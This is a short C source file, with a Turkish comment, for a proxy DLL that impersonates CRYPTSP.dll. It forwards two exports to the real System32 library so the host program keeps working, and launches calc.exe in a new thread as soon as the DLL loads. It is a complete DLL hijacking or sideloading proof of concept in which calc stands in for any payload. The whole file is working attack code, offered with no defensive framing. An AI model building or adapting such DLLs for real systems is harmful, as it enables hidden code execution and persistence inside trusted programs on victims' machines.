#include <windows.h>

// CRYPTSP.dll içindeki gerçek fonksiyonları System32'deki meşru DLL'e yönlendiriyoruz
#pragma comment(linker, "/export:CryptAcquireContextW=C:\\Windows\\System32\\cryptsp.CryptAcquireContextW")
#pragma comment(linker, "/export:CryptReleaseContext=C:\\Windows\\System32\\cryptsp.CryptReleaseContext")

DWORD WINAPI LaunchCalc(LPVOID lpParam)
{
    WinExec("calc.exe", SW_SHOW);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;

    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, LaunchCalc, NULL, 0, NULL);
    }

    return TRUE;
}